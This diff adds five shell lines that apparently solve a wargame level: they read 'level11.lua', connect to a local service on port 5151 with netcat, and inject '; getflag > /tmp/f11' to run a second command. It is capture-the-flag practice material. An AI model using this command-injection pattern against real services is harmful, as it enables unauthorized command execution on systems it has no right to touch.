@@ -1,0 +1,5 @@
+ cat level11.lua
+ nc -zv localhost 5151
+ nc localhost 5151
+     ; getflag > /tmp/f11
+ cat /tmp/f11
